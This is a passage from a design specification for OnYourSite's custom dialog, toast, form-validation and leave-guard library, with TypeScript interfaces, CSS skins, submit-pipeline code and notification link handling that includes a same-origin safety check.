The file is published in PR 0 and needs sign-off from honeycomb-shop and code-slots-admin (the two heaviest users),
with premium-domains, status-pages and discord-pages as reviewers. After that, changes are additive only. `ui.js`
warns in the console about unknown option keys, so a placeholder name from another design (`confirmLabel`, `danger`,
`expect`) is caught in the first test run. The mapping from those placeholder names is in §11.3.

```ts
// static/js/ui.d.ts – Vertrag für window.OYSUI (eigene Dialoge, Hinweise, Formulare). Nur additive Änderungen.
export type DialogTone = 'default' | 'warn' | 'danger' | 'hc';
export type ToastTone = 'ok' | 'info' | 'warn' | 'err' | 'hc';
export type Values = Record<string, string | boolean>;            // benannte Felder im Dialog
export type Content = Node | ((body: HTMLElement, ctl: Ctl) => void);
export type Normalize = 'trim' | 'lower' | 'slug' | 'host' | ((s: string) => string);

export interface Ctl {                                            // an content-Builder und onConfirm übergeben
  readonly body: HTMLElement;
  values(): Values;                                               // checkbox → boolean, radio → gewählter Wert, sonst .value
  update(p: { title?: string; text?: string; list?: string[]; tone?: DialogTone; ok?: string;
              okDisabled?: boolean; content?: Content }): void;   // Dialog bleibt offen, Fokus bleibt im Dialog
  message(text: string, kind?: 'err' | 'info'): void;             // Zeile über den Knöpfen; '' leert sie
  error(text: string): void;                                      // = message(text, 'err')
  close(): void;                                                  // wie Abbrechen
}
export type OnConfirmResult = void | true | false | string;       // void/true: schließen · false: offen · string: Fehler, offen

export interface DialogOptions {
  title?: string; text?: string; list?: string[]; tone?: DialogTone; icon?: string;
  ok?: string; cancel?: string;
  content?: Content;                                              // eigener Inhalt (Preisbox, Checkboxen …)
  canConfirm?(values: Values): boolean;                           // nach jeder Eingabe; false = OK gesperrt
  onConfirm?(value: any, ctl: Ctl): OnConfirmResult | Promise<OnConfirmResult>;
                                                                  // value: confirm → Values, prompt → Text, choice → Wert
  focus?: 'ok' | 'cancel' | 'input' | string;                     // string = Selektor im Dialog
  fallbackFocus?(): HTMLElement | null;                           // falls der Auslöser beim Schließen fehlt
}
export interface PromptOptions extends DialogOptions {
  label?: string; value?: string; placeholder?: string; type?: 'text' | 'email' | 'url' | 'password';
  maxLength?: number; inputMode?: string; autocomplete?: string;
  match?: string; matchLabel?: string;                            // Tippen zum Bestätigen; verglichen nach normalize
  normalize?: Normalize;                                          // für Vergleich und Ergebnis (Standard 'trim')
  transform?: 'lower' | 'slug' | ((s: string) => string);         // ändert das Feld beim Tippen
  validate?(v: string): string;                                   // '' = gültig
}
export interface ChoiceOptions extends DialogOptions {
  options: { value: string; text: string; tone?: DialogTone; primary?: boolean }[];   // 2–3 Knöpfe
}
export interface SubmitConfirm extends PromptOptions { into?: string }   // Feldname für den getippten Wert

export interface Notice {                                         // Server → Client, immer oberste Ebene: notices[]
  tone: ToastTone; text: string; title?: string; amount?: number; action?: { label: string; link: string };
}
export interface ToastOptions {
  text: string; tone?: ToastTone; title?: string; amount?: number;
  action?: { label: string; link?: string; run?(): void };
  duration?: number;                                              // ms; 0 = bleibt bis zum Schließen
  id?: string;                                                    // gleiche id ersetzt den Hinweis
}
export interface Guard {
  isDirty(): boolean;
  confirm(o?: Partial<DialogOptions>): Promise<boolean>;          // sofort true, wenn nichts ungespeichert ist
  navigate(url: string, o?: { force?: boolean }): Promise<boolean>;
  reload(o?: { force?: boolean }): Promise<boolean>;
}
export interface OYSUI {
  alert(o: DialogOptions | string): Promise<void>;
  confirm(o: DialogOptions | string): Promise<boolean>;
  prompt(o: PromptOptions): Promise<string | null>;
  choice(o: ChoiceOptions): Promise<string | null>;
  toast(o: ToastOptions | string, tone?: ToastTone): { close(): void };
  notices(list?: Notice[], more?: { label: string; link: string }): void;      // Warteschlange, 700 ms versetzt
  handle<T extends object>(status: number, data: T): T;           // 401/419/409+reload → Sitzungsdialog; data.notices → Hinweise
  layer(el: HTMLElement, o?: { labelledBy?: string; onEscape?(): void; fallbackFocus?(): HTMLElement | null }):
    { release(): void } | null;                                   // el muss direktes Kind von <body> sein
  isOpen(): boolean;
  validate(form: HTMLFormElement): boolean;
  beforeSubmit(form: HTMLFormElement, fn: (form: HTMLFormElement, submitter: HTMLElement | null) =>
    null | false | SubmitConfirm | Promise<null | false | SubmitConfirm>): void;   // null: ohne Frage senden · false: abbrechen
  guard(o: { isDirty(): boolean; onDiscard?(): void; keepsDraft?: boolean }): Guard;  // eine Wache je Seite, Quellen verodert
  navigate(url: string): Promise<boolean>;                        // über die Wache, falls vorhanden
  reload(): Promise<boolean>;
  openLink(link: string): boolean;                                // nur eigene Pfade (§6.10); false = abgelehnt
  onLink(fn: (url: URL) => boolean): void;                        // Seite übernimmt eigene Ziele (Tabs, Admin-Bereiche)
  normalize: { trim(s: string): string; lower(s: string): string; slug(s: string): string; host(s: string): string };
  readonly skin: 'app' | 'page';                                  // automatisch: body.oys → 'page'
}
declare global { interface Window { OYSUI: OYSUI } }
```

Notes on the contract:
- **Custom content.** `content` is a node or a builder. The library itself never parses strings as HTML (`title`,
  `text`, `list`, toast texts always go in with `textContent`). A builder is caller code under the same rule as the
  editor's existing `openModal(title, bodyHtml)` (`editor.js:675`): build DOM, or HTML only from `esc()`-ed values.
- **Dialogs that run requests** (honeycomb-shop's purchase): `onConfirm(values, ctl)` reads the checkboxes
  (`values.auto_renew`, `values.terms`), runs the request, and on `price_changed` calls
  `ctl.update({ok: 'Buy for 280', content: newPriceBox})` and returns `'The price changed – this now costs 280
  honeycombs (it was 350).'` – the dialog stays open, the caller keeps its request id. `canConfirm(v)` keeps *Buy*
  disabled until the terms box is ticked.
- **Type-to-confirm with normalisation.** `normalize` is applied to both sides before comparing and to the result.
  `'host'` strips a pasted scheme and path and converts internationalised names with `new URL('http://' + s).hostname`,
  so for a stored `xn--bcher-kva.de` the user may type `bücher.de` or the punycode form (premium-domains). `matchLabel`
  is what the dialog shows ("Type bücher.de to confirm").
- **`value` of `confirm`'s `onConfirm`** is `ctl.values()` (`{}` without fields); the promise of `confirm` still
  resolves `true`/`false`.
- **Body order:** `text`, `list`, `content`, the prompt's field, the message line. Nodes (a "Download files" button, a
  price box) always go into `content`; `text` is plain text only.

**Declarative attributes** (server-rendered forms, no script needed):

| Attribute | On | Meaning |
|---|---|---|
| `data-confirm` | form or submit button | Dialog title; its presence turns the confirmation on (the button's attributes win) |
| `data-confirm-text`, `data-confirm-ok`, `data-confirm-tone` | 〃 | Explanation, OK label, `warn`·`danger`·`hc` |
| `data-confirm-match` | 〃 | Value that must be typed (typed confirmation) |
| `data-confirm-label` | 〃 | Field label, default "Type {match} to confirm" |
| `data-confirm-normalize` | 〃 | `trim`·`lower`·`slug`·`host` |
| `data-confirm-into` | 〃 | Name of the form field that receives the typed, normalised value (created as hidden input when missing) – code-slots-admin's admin *Delete* sends it as `confirm` |
| hidden `_confirmed` | form | Rendered as `0` by `confirmField()`, set to `1` by `ui.js` (§5.6) |
| `data-guard="off"` | form or link | The leave guard ignores it |
| `data-error-<key>` | field | Own text for `required`, `type`, `short`, `long`, `min`, `max`, `step`, `number`, `pattern`, `match` |
| `data-match="otherName"` | field | Must equal the named field |
| `data-flash="ok\|err"` | banner | Turned into a toast (§5.5) |

Conditional confirmations use `OYSUI.beforeSubmit(form, fn)` from the page's script (e.g. honeycomb-shop: ask only
when the grant amount is negative; the newsletter text below).

### 6.3 Behaviour rules

- **Stack.** Each open layer (our dialogs and registered overlays) is pushed on a stack; `z-index = 300 + 2 × depth`
  set inline (above the editor modal 100, previews 90/95, the impersonation bar `z-[200]`); toasts sit at 1000. At
  most 5 layers: a 6th dialog resolves at once as *Cancel* (`false`/`null`) with a console warning; `layer()` returns
  `null`. (Today the deepest nesting is 2: the honeycomb window plus a confirm.)
- **`layer(el)`** requires `el` to be a direct child of `<body>`; otherwise it logs an error and returns `null`.
  Reason: `inert` on an ancestor cannot be undone for a descendant. All overlays registered in §7 are direct children
  today (`#modal`, `#bigPreview`, `#mobilePreview` in `views/dashboard.php:217-231`, `#pwdModal` at
  `views/admin.php:601`, `#oys-modal` at `lib/render.php:204`, the lightbox appended in `page.js:279`).
- **Background.** All other children of `<body>` get `inert` (restored on close; only attributes we set are
  removed). The toast container is never inert, so live announcements keep working during a dialog.
- **Focus.** On open, focus goes (`preventScroll: true`) to: the input (prompt), *Cancel* (tones warn/danger), the
  primary button (otherwise); if that target is disabled, to the first enabled control. Tab / Shift+Tab cycle inside
  the top layer. On close, focus returns to the element that had it (`preventScroll: true`); if that element is gone,
  to `fallbackFocus()` or the next focusable ancestor.
- **Keys.** One capture-phase `keydown` listener: Escape closes only the top layer (= Cancel; ignored while busy),
  calls `preventDefault()` and stops propagation, so `editor.js`'s own Escape handler does not close the modal
  underneath and no extra close request reaches a `CloseWatcher`. Enter in a prompt submits; on buttons the browser's
  default applies. Escape and Enter are ignored while `ev.isComposing` (or `keyCode 229`), so IME input is not cut off.
- **Back gesture.** Where `CloseWatcher` exists (Chromium, including Android's back gesture), every layer gets one;
  its `close` event = *Cancel* of the top layer (while busy: a new watcher is created and the dialog stays). No history
  entries are pushed: the editor rewrites the current entry in `switchTab` (`editor.js:1016`), and a pushed entry
  removed with `history.back()` would race with that. Browsers without `CloseWatcher` treat Back as page navigation
  (leave guard rules, §6.9).
- **Backdrop click** = Cancel for alert/confirm/choice; ignored for prompts and dialogs with fields (typed text is not
  lost) and while busy. Registered overlays keep their own rule (the crop guard in `editor.js:689`).
- **Busy.** While `onConfirm` runs: spinner in the OK button, `aria-busy`, all buttons disabled, Escape/backdrop/Back
  ignored. A string result shows in `.ui-msg` (`role=alert`) and re-enables the buttons; a thrown error shows
  "Something went wrong. Please try again.".
- **Toasts while a layer is open.** Clicking a toast only dismisses it; toasts with a link or action are held (their
  timer does not run) until the stack is empty, then behave normally. Every toast action is also reachable elsewhere
  (bell item, tab, nav), so a keyboard user never depends on reaching a toast.
- **No scroll jump.** On the first layer `html` gets `ui-lock` (`overflow: hidden`); if the page had a scrollbar,
  also `scrollbar-gutter: stable` (fallback when unsupported: `padding-right` = scrollbar width) so nothing shifts
  sideways. The scroll position is never written; focus calls use `preventScroll`. App pages scroll inside `main`,
  which stays untouched. `overscroll-behavior: contain` on the layer and the dialog body.
- **ARIA.** `alert` and `confirm`: `role="alertdialog"`; `prompt`, `choice`, dialogs with `content` fields and
  registered overlays: `role="dialog"`; always `aria-modal="true"`, `aria-labelledby` (title), `aria-describedby`
  (text). Toast container `aria-live="polite"`; error toasts `role="alert"`; the amount badge reads "+50 honeycombs"
  (visible "+50" and the hive icon, hidden text " honeycombs"). Close buttons have `aria-label="Close"` / toasts
  "Dismiss".
- **Reduced motion:** animations off.
- **Browser support:** current Chrome, Edge and Firefox, Safari and iOS **15.5+** (the last version for iPhone 6s/7 is
  15.8). Used directly: `inert` (Safari 15.5), `SubmitEvent.submitter` (15.4). Feature-detected with a fallback that
  the component tests force (§9): `requestSubmit` (Safari 16 – fallback: hidden input with the submitter's name/value +
  `HTMLFormElement.prototype.submit`), `scrollbar-gutter` (Safari 18.2 – fallback: padding), `dvh` (a `vh` line
  first), `CloseWatcher` (no Back handling without it).

### 6.4 Base rules and app skin (`static/css/ui.css`) – the editor's look

```
┌──────────────────────────────────────────────┐
│ [!]  Delete this block?                   ✕  │  .ui-head: tone icon 34×34 r9, title 15px/600 #fff, border-bottom #27272a
├──────────────────────────────────────────────┤
│ It’s removed from your page when you save.   │  .ui-body: 18px padding, text 14px #a1a1aa (scrolls)
├──────────────────────────────────────────────┤
│                        Cancel   [ Delete ]   │  .ui-foot: .ui-msg line, ghost + danger/primary buttons, gap 8px
└──────────────────────────────────────────────┘
```

Base rules, injected by `ui.js` for both skins (`#oys-ui-base`):

```css
/* Grundregeln beider Skins – ui.js fügt sie als erstes <style> in <head> ein; die Skins liefern nur das Aussehen */
html.ui-lock { overflow: hidden; }
html.ui-lock.ui-gutter { scrollbar-gutter: stable; }
.ui-layer { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 16px; overscroll-behavior: contain; }
.ui-dialog { width: 100%; max-height: 86vh; max-height: min(86vh, 86dvh); display: flex; flex-direction: column; }
.ui-body { flex: 1 1 auto; min-height: 0; overflow-y: auto; overscroll-behavior: contain; }
.ui-toasts { position: fixed; top: var(--ui-toast-top, 76px); left: 50%; transform: translateX(-50%); z-index: 1000; display: flex;
  flex-direction: column; gap: 8px; align-items: center; pointer-events: none; }
.ui-toast { pointer-events: auto; display: flex; align-items: center; gap: 8px; max-width: 92vw; animation: ui-in .2s; }
.ui-sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; }
@media (prefers-reduced-motion: reduce) { .ui-layer, .ui-dialog, .ui-toast { animation: none !important; } }
@keyframes ui-in { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: none; } }
@keyframes ui-spin { to { transform: rotate(360deg); } }
```

App skin (`ui.css`). Values are copied from `editor.css` so admin, auth, landing and 404 look exactly like the
editor. The honeycomb tokens are defined **here, once** (all app pages load `ui.css`, the dashboard and admin
included); honeycomb-shop uses them in `editor.css` instead of defining its own copy:

```css
/* OnYourSite – eigene Dialoge und Hinweise (App-Seiten). Gleiche Werte wie .modal und .toast im Editor. */
:root { --ui-toast-top: 76px;
  --hc: #facc15; --hc-2: #fde047; --hc-text: #fef08a; --hc-soft: rgba(250, 204, 21, .12); --hc-line: rgba(250, 204, 21, .35); }
.ui-layer { background: rgba(0, 0, 0, .7); backdrop-filter: blur(4px); animation: ui-in .15s; }
.ui-dialog { max-width: 440px; background: #0c0c0e; border: 1px solid #27272a; border-radius: 16px; box-shadow: 0 40px 80px -20px #000;
  color: #d4d4d8; font: inherit; font-size: 14px; }
.ui-head { display: flex; align-items: center; gap: 12px; padding: 16px 18px; border-bottom: 1px solid #27272a; }
.ui-ico { width: 34px; height: 34px; border-radius: 9px; flex: none; display: grid; place-items: center; font-size: 18px;
  background: rgba(99, 102, 241, .14); color: #818cf8; }
.ui-dialog.is-danger .ui-ico { background: rgba(239, 68, 68, .14); color: #f87171; }
.ui-dialog.is-warn .ui-ico { background: rgba(245, 158, 11, .14); color: #fbbf24; }
.ui-dialog.is-hc .ui-ico { background: var(--hc-soft); color: var(--hc); }
.ui-title { flex: 1; margin: 0; color: #fff; font-size: 15px; font-weight: 600; }
.ui-x { width: 34px; height: 34px; border-radius: 8px; display: grid; place-items: center; color: #71717a; font-size: 18px;
  background: transparent; border: 0; cursor: pointer; }                                  /* wie .icon-btn */
.ui-x:hover { background: rgba(255, 255, 255, .06); color: #fff; }
.ui-spin { width: 14px; height: 14px; border: 2px solid currentColor; border-right-color: transparent; border-radius: 50%;
  animation: ui-spin .7s linear infinite; }
.ui-body { padding: 18px; }
.ui-text { margin: 0; color: #a1a1aa; line-height: 1.55; white-space: pre-line; overflow-wrap: anywhere; }
.ui-input { width: 100%; margin-top: 6px; background: #121212; border: 1px solid #27272a; border-radius: 8px;
  padding: 9px 13px; color: #fff; font-size: 14px; outline: none; }
.ui-input:focus { border-color: #6366f1; box-shadow: 0 0 0 1px #6366f1; }
.ui-msg { flex-basis: 100%; margin: 0; font-size: 13px; color: #a5b4fc; }  .ui-msg.is-err { color: #f87171; }
.ui-foot { display: flex; flex-wrap: wrap; justify-content: flex-end; gap: 8px; padding: 14px 18px; border-top: 1px solid #27272a; }
.ui-btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 8px 14px; border-radius: 8px;
  font-size: 13px; font-weight: 600; border: 1px solid transparent; cursor: pointer; transition: all .15s; }
.ui-btn.is-primary { background: #fff; color: #000; }            .ui-btn.is-primary:hover { background: #e5e7eb; }
.ui-btn.is-ghost { background: transparent; color: #a1a1aa; }    .ui-btn.is-ghost:hover { color: #fff; background: rgba(255, 255, 255, .05); }
.ui-btn.is-danger { background: rgba(239, 68, 68, .1); color: #f87171; border-color: rgba(239, 68, 68, .25); }
.ui-btn.is-hc { background: var(--hc); color: #000; }
.ui-btn:disabled { opacity: .55; cursor: not-allowed; }
.ui-btn:focus-visible, .ui-x:focus-visible, .ui-toast button:focus-visible { outline: 2px solid #818cf8; outline-offset: 2px; }
.ui-toast { padding: 9px 14px; border-radius: 10px; font-size: 13px; font-weight: 500; backdrop-filter: blur(10px);
  box-shadow: 0 12px 30px -10px rgba(0, 0, 0, .8); }
.ui-toast b { display: block; color: #fff; font-weight: 600; }                                 /* Titel */
.ui-toast.ok   { background: rgba(16, 185, 129, .14); border: 1px solid rgba(16, 185, 129, .3); color: #34d399; }
.ui-toast.err  { background: rgba(239, 68, 68, .14); border: 1px solid rgba(239, 68, 68, .3); color: #f87171; }
.ui-toast.info { background: rgba(99, 102, 241, .14); border: 1px solid rgba(99, 102, 241, .35); color: #a5b4fc; }
.ui-toast.warn { background: rgba(245, 158, 11, .14); border: 1px solid rgba(245, 158, 11, .35); color: #fbbf24; }
.ui-toast.hc   { background: var(--hc-soft); border: 1px solid var(--hc-line); color: var(--hc-2); }
.ui-amt { display: inline-flex; align-items: center; gap: 3px; padding: 1px 7px; border-radius: 999px; font-weight: 700;
  font-variant-numeric: tabular-nums; background: var(--hc-soft); color: var(--hc); }
.ui-toast-act { margin-left: 4px; padding: 3px 9px; border-radius: 7px; font-weight: 600; color: inherit;
  background: rgba(255, 255, 255, .06); border: 1px solid currentColor; cursor: pointer; }
.ui-field-err { display: flex; gap: 4px; align-items: center; margin-top: 6px; font-size: 12px; color: #f87171; }
[aria-invalid="true"], [data-field][data-invalid] { border-color: rgba(239, 68, 68, .6) !important; box-shadow: 0 0 0 1px rgba(239, 68, 68, .35) !important; }
@media (max-width: 639px) { .ui-input { font-size: 16px; } .ui-foot .ui-btn { flex: 1 1 auto; } }
```

Explicit values everywhere because Tailwind's preflight resets `button` and `h2` on these pages. Pages with an 80 px
nav (landing, 404, updates) set `--ui-toast-top: 96px` on `<body>`. **This feature owns `.ui-toast.*`.** The old
`.toasts`/`.toast*` rules in `editor.css` (`:311-316`, `:429`) stay untouched until release 3.1 (the PHP-rollback
fallback still uses them, §11.2) and are deleted by the 3.1 cleanup; nothing in this design edits them, so
honeycomb-shop's planned recolour of `.toast.hc` (`honeycomb-shop.md` §5.1) does not conflict – it is no longer needed
for the visible toasts, which are `.ui-toast.hc` and yellow from PR 1.

### 6.5 Page skin (profile and public status pages follow the theme)

Same DOM, styled in `page.css` by **grouping selectors with the existing dialog rules** (`page.css:592-626`), so the
look is identical to today's password / 18+ / share dialog and every theme variable applies (`--surface`,
`--surface-text`, `--accent`, `--on-accent`, `--card-border`, `--card-radius`, `--input-*`, `--icon-bg`, `--font-head`):

```css
/* Eigene Dialoge (ui.js) im Design der Seite – dieselben Regeln wie der Passwort-/18+-Dialog */
.oys-modal, body.oys .ui-layer { … }                 .oys-modal-box, body.oys .ui-dialog { … }
.oys-modal-icon, body.oys .ui-ico { … }              .oys-modal-close, body.oys .ui-x { … }
.oys-modal h2, body.oys .ui-title { … }              .oys-modal p, body.oys .ui-text { … }
.oys-modal input, body.oys .ui-input { … }           .oys-modal .oys-err, body.oys .ui-msg.is-err { … }
.oys-modal .oys-btn, body.oys .ui-btn { … }          .oys-modal .oys-btn.ghost, body.oys .ui-btn.is-ghost { … }
.oys-modal-box { max-height: 86vh; max-height: min(86vh, 86dvh); overflow-y: auto; }   /* auch der bestehende Dialog */
body.oys .ui-head { display: block; text-align: center; }
body.oys .ui-foot { display: flex; flex-direction: column-reverse; gap: 8px; }    /* Hauptknopf oben, wie beim 18+-Dialog */
body.oys .ui-btn.is-danger { background: #ef4444; color: #fff; }
body.oys .ui-toast { background: var(--surface); color: var(--surface-text, var(--text)); border: var(--card-border);
  border-radius: min(14px, var(--card-radius)); font-family: var(--font); }
body.oys .ui-field-err { color: #ef4444; font-size: .82em; font-weight: 600; margin: 6px 0 0; }
body.oys [aria-invalid="true"] { border-color: #ef4444 !important; }
```

Icons on profile pages are small inline SVGs inside `ui.js` (check, error, info, hive, lock, close) because Boxicons
are only loaded there when a block needs them (`lib/render.php:122`). The spinner is CSS only. Public pages have no
honeycomb UI, so the page skin needs no `--hc*` tokens (a public feature that ever shows one adds the same five tokens
to `page.css`). status-pages' public page uses this skin (`body.oys`, `page.css` loaded – `status-pages.md` §5.3);
its management UI (`status-manage.js` in the editor tab and the admin section) uses the app skin.

### 6.6 Toasts and notices

`editor.js`'s `toast(msg, type)` (`:55-60`) becomes `return UI.toast(msg, type)`; its ~70 call sites keep working.
Same position (top centre, below the header), sizes, icons (`bx-check-circle`, `bx-error-circle`, `bx-info-circle`,
`bx-hive`, new `bx-wifi-off` for warn) and timings. The object form adds a bold `title`, an `amount` badge and one
`action` button (`link` through `openLink`, or `run`).

- **Queue, nothing dropped.** At most 4 toasts are visible; further ones wait in order and enter when one leaves.
- **`notices(list, more)`** shows a batch 700 ms apart (today's stagger, `editor.js:2853-2858`). A batch of more than
  6 shows the first 5 and one "+N more" toast (with `more` as its action, e.g. *History* → `/dashboard#honeycombs`),
  so the count is never lost.
- **Durations:** ok/info/hc 3000 ms, warn 5000, err 5200 (like `editor.js:59`), with an action ≥ 8000; `0` = sticky.
  Hover/focus pauses the timer (WCAG 2.2.1); a held toast (§6.3) does not count down.
- **Close button** on sticky and error toasts and toasts with an action; 2-second de-duplication; `id` replace
  ("Uploading…" → result); live region.
- **Session state:** while a session dialog is open or the "You’re logged out." toast is shown, error toasts are not
  shown (each failing request would repeat the same problem).
- `#toasts` is removed from the Node dashboard view (the container is created on first use; the legacy fallback
  creates `#toasts` when it needs it).

### 6.7 Form checks (replace validation bubbles everywhere)

One capture listener on `document` handles every form of every page that loads `ui.js` – existing forms, the forms of
the other five designs and forms built by scripts (`page.js:155`) – without any per-form attribute:

```js
// Eigene Meldungen statt Browser-Blasen – für jedes Formular, auch neue und per Skript gebaute
document.addEventListener('invalid', function (ev) {
  var el = ev.target;
  ev.preventDefault();                    // ein abgebrochenes invalid-Ereignis unterdrückt die Blase des Browsers
  showFieldError(el, messageFor(el));     // Text aus data-error-* oder Standardtext (Tabelle unten)
  focusFirstSoon(el);                     // nach dieser Runde: erstes ungültiges Feld (DOM-Reihenfolge) fokussieren
}, true);
```

Per the HTML spec, interactive validation only reports problems for controls whose `invalid` event was not
cancelled, so the browser shows no bubble; the form is still not submitted. Because the browser then focuses
nothing, `ui.js` focuses the first invalid field itself (`block: 'center'`, `preventScroll` + `scrollIntoView`).

| Validity | Default text (override per field with `data-error-<key>`) |
|---|---|
| `valueMissing` | "Please fill in this field." · select: "Please choose an option." · date: "Please choose a date." · checkbox: "Please tick this box." |
| `typeMismatch` | email: "Please enter a valid email address." · url: "Please enter a full link, e.g. https://example.com." |
| `tooShort` / `tooLong` | "Please use at least {min} characters." / "Please use at most {max} characters." |
| `rangeUnderflow` / `rangeOverflow` | "Please enter {min} or more." / "Please enter {max} or less." · dates formatted "Nov 1, 2026" |
| `stepMismatch` / `badInput` | "Please enter a whole number." / "Please enter a number." |
| `patternMismatch` | "Please match the requested format." (forms should set `data-error-pattern`) |
| `data-match="otherName"` | "The values don’t match." (override with `data-error-match`) – kept up to date with `setCustomValidity()` on `input`/`change`, so the browser's own check includes it |

- The message goes into `<p class="ui-field-err" id="…">` after the field, or after the closest `[data-field]`
  wrapper (for grouped inputs such as the address field with its `.on-your.site` suffix, `views/register.php:70-73`);
  the field gets `aria-invalid="true"` and `aria-describedby`. After the first attempt each field re-checks on
  `input`/`change` and clears its message when valid.
- An invalid field that is not rendered (in a hidden section, e.g. the Discord mode fields) cannot show a message or
  take focus; `ui.js` shows an error toast "Please check “{label}”." instead (today Chrome only logs "An invalid form
  control … is not focusable" and nothing happens).
- Forms with `novalidate` (the contact form, `lib/render.php:526`) call `OYSUI.validate(form)` in their own submit
  handler; it runs the same checks and returns `true`/`false`. Note for page scripts: `checkValidity()` also fires
  `invalid` and therefore shows messages; a silent check uses `el.validity.valid`.
- The server keeps all its checks; client texts reuse the server's wording where it exists.
- `data-validate` and the `novalidate data-validate` opt-in of the first draft are gone.

### 6.8 Declarative and conditional confirmations for server forms

```html
<form … data-confirm="Delete this user?" data-confirm-text="Mia (mia@test.de) and all their pages … can’t be undone."
       data-confirm-ok="Delete user" data-confirm-tone="danger"> <!-- confirmAttrs() -->
  <input type="hidden" name="_confirmed" value="0" autocomplete="off"> <!-- confirmField() -->
<button type="submit" name="community_action" value="ticket_close" data-confirm="Close this ticket?" …>
<form … data-confirm="Delete “studio”?" data-confirm-match="studio" data-confirm-normalize="slug" data-confirm-into="confirm">
```

**Submit pipeline** (in `ui.js`):
1. The browser validates (§6.7). Only valid forms reach `submit`.
2. Capture-phase `submit`: if the form has a `beforeSubmit` handler or the submitter/form has `data-confirm`, the
   submit is stopped (`preventDefault()` + `stopImmediatePropagation()`). The handler runs first: `null` → no
   question; `false` → cancelled; options → that dialog (a typed one when `match` is set). Otherwise the
   `data-confirm*` attributes build the dialog.
3. On OK (or `null`): `_confirmed` = `1`, the typed value into the `into` field, then a one-time pass-through
   re-submit with the pressed button (the capture listener clears `__oysPass` when it lets that submit through):

```js
// Bestätigt: Formular erneut absenden – mit dem gedrückten Knopf (name/value), damit z. B. ticket_close ankommt
form.__oysPass = true;
if (form.requestSubmit) form.requestSubmit(btn && btn.form === form ? btn : undefined);
else {                                                  // Safari 15.5–15.x: kein submit-Ereignis
  if (btn && btn.name) { var h = document.createElement('input'); h.type = 'hidden'; h.name = btn.name; h.value = btn.value; form.appendChild(h); }
  HTMLFormElement.prototype.submit.call(form);
  form.__oysPass = false;
}
// Danach: keine zweite Sendung (Newsletter!) – erst die nächste Seite oder pageshow gibt die Knöpfe frei
setTimeout(function () { lockSubmitButtons(form); }, 0);
```

4. `lockSubmitButtons` disables every submit button of the form and sets `aria-busy="true"` on it; it runs after the
   submission has built its form data, so the pressed button's `name/value` is still sent. On `pageshow` (back/forward
   cache) the buttons are released and `_confirmed` is reset to `0`.

- The submitter comes from `SubmitEvent.submitter`. The CSRF field is part of the form, so nothing changes for the
  server apart from §5.6.
- If `ui.js` did not load, the form posts `_confirmed=0` and the server refuses it (§5.6) – **fail closed**. The
  admin area needs JavaScript anyway (tabs, `views/admin.php:624-653`).
- `data-confirm-fill` of the first draft is gone; texts that depend on form values come from `beforeSubmit` (the
  newsletter, §7.2), so form values never reach a dialog text through placeholders.
- **Inline handlers.** All inline confirmations (`onsubmit="return confirm…"`, `onclick="return confirm…"`) and the
  reset-password handlers (`views/admin.php:447,605,616`) go. Other inline handlers stay and are **not** part of this
  feature: the admin nav `views/admin.php:287-323` (rewritten by code-slots-admin's admin split), `:385`, `:509`,
  `views/admin_updates.php:93,237`, `views/landingpage.php:109`. A strict `script-src` needs those converted first;
  this design makes no CSP claim.

### 6.9 Leave guard

`OYSUI.guard({isDirty, onDiscard, keepsDraft})` returns the page's single guard (further calls add more dirty
sources, e.g. status-pages' management form inside the editor):

- **Links.** Intercepted: primary click without modifier keys, `target` empty or `_self`, no `download`, `href` with
  scheme `http:` or `https:` (any origin – a link to another site in the same tab unloads the editor too), not a
  hash-only link on the same page, no `data-guard="off"`. Not intercepted: `mailto:`, `tel:` and every other scheme;
  for these the guard sets a 1.5-second bypass, so browsers that fire `beforeunload` for external protocols show no
  dialog, and the protection is back right after.
- **Forms.** Bubble-phase `submit` listener (after the page's own listeners): same tab, `defaultPrevented` false, no
  `data-guard="off"`, not a pass-through re-submit (§6.8).
- **Code navigations.** `guard.navigate(url, {force})`, `guard.reload({force})`, `OYSUI.navigate()`. Without `force`
  they ask when dirty; with `force` (the user already confirmed, or the draft keeps the work) they go at once. The
  lint (§7.5) forbids `location.href =`, `location.assign/replace/reload` in scripts that create a guard.
- **Bypass** (after "Leave without saving" or `force`): one-shot – used up by the next `beforeunload` – and expires
  after 1.5 s and on `focus`/`pageshow`. A link that turns out to be a download, or a `mailto:`, therefore never
  switches the protection off for later.
- **Leave without saving** calls `onDiscard` (the editor deletes the draft, §6.11). Forced navigations keep the draft.
- **`beforeunload`** stays registered for tab close, reload and Back out of the page: browsers allow no own dialog
  there, and a cross-document Back navigation cannot be intercepted by a page. iOS Safari shows no dialog at all; the
  draft covers it. Q6: drop it whenever a draft was stored.
- `guard.confirm(texts)` resolves `true` at once when nothing is dirty – used by page switches and deep links.

### 6.10 Bell (editor and admin header)

The bell logic moves from `editor.js:641-670` into `static/js/bell.js` (`OYSBell.mount(root, opts)`), used by the
editor and by a new bell in the admin header (`views/admin.php:340-349`, markup copied from
`views/dashboard.php:120-126` by `bellMarkup()`, next to "View Live Site", with `data-csrf`). Its dependencies are
passed in (`opts.toast`, `opts.handle`, `opts.openLink`, `opts.onNew`), so it also runs with the editor's legacy
adapter during a PHP rollback (§11.2).

- Item icon and colour from `icon`/`tone` (class validated against `^bx[sl]?-[a-z0-9-]+$` before use); unread style as
  today (`editor.css:48-54`); `#bellBtn` gets `aria-expanded`, `#bellMenu` `role="region" aria-label="Notifications"`.
  Answers without `icon`/`link` (the PHP API during a rollback) fall back to today's type icons and
  `/dashboard#messages`.
- Click on an item: `notifications-read {id}` (fire and forget) and `OYSUI.openLink(link)`:
  1. The link must match the server's `safeLink` rule (`^/(?!/)[A-Za-z0-9/_.~%#?=&-]*$`) **and**
     `new URL(link, location.origin).origin === location.origin`; otherwise it is ignored (`/\evil.example` fails both).
  2. The page's `onLink(url)` handler may take it: the editor maps `/dashboard#<target>[/<arg>]` to in-app routes
     (`content|design|stats|messages|code|settings` → tab, `honeycombs` → honeycomb tab, more targets registered by
     the features in a `DEEP_LINKS` map; `arg` e.g. `premium` selects a shop card); the admin page maps
     `/admin#<tab>` to `switchAdminTab(tab)`. A handler only takes links whose path and query equal the current
     page's; code-slots-admin's `/dashboard?site=ID#code` therefore goes to step 3.
  3. Otherwise `OYSUI.navigate(url)` (asks first when the editor has unsaved changes). On load, `#honeycombs` (and
     registered targets) open too.
